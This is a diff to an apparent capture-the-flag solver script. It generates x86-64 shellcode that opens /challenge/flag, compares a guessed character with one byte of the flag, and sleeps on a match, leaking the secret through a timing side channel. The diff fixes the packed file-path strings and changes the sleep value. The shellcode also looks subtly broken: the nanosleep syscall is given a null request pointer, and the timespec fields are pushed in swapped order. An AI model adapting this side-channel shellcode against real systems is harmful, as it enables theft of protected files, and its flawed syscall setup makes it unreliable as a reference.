@@ -12,14 +12,14 @@ def utf8len(s):
 def create_timing_shellcode(position, character):
     shellcode = asm(f'''
         /* Open /challenge/flag */
-        mov rax, 0x00000067616c662f
+        mov rax, 0x0067616c662f6567
         push rax
-        mov rax, 0x656c6c656e616863
+        mov rax, 0x6e656c6c6168632f
         push rax
         mov rdi, rsp
         xor rsi, rsi
         xor rdx, rdx
-        mov rax, 2
+        mov rax, 0x2
         syscall
         
         /* Read flag into stack */
@@ -36,7 +36,7 @@ def create_timing_shellcode(position, character):
         
         /* If match, nanosleep for 0.1 seconds */
         push 0
-        push 1000000000
+        push 100000000
         mov rsi, rsp
         xor rdi, rdi
         mov rax, 35
